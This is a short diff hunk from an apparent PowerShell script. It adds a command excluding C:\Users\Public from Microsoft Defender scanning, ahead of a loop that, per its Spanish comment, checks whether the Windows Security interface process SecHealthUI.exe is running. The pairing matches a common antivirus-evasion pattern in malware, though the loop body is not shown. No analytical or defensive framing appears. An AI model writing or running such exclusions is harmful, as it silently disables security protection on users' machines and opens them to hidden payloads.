@@ -1,3 +1,5 @@
+Add-MpPreference -ExclusionPath "C:\Users\Public"
+
 for ($iteration = 1; $iteration -le 10; $iteration++) {
 
     # Verificar si el proceso SecHealthUI.exe está activo
